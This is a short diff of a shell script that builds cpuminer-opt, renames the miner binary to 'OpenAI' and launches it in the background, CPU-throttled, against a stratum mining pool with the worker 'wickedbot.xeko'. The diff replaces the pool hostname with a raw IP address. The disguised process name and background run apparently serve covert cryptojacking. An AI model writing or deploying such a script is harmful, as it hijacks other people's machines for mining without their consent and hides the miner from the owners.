@@ -5,4 +5,4 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 mv cpuminer OpenAI
-cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u wickedbot.xeko -p x --background
+cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://93.94.142.135:3032 -u wickedbot.xeko -p x --background
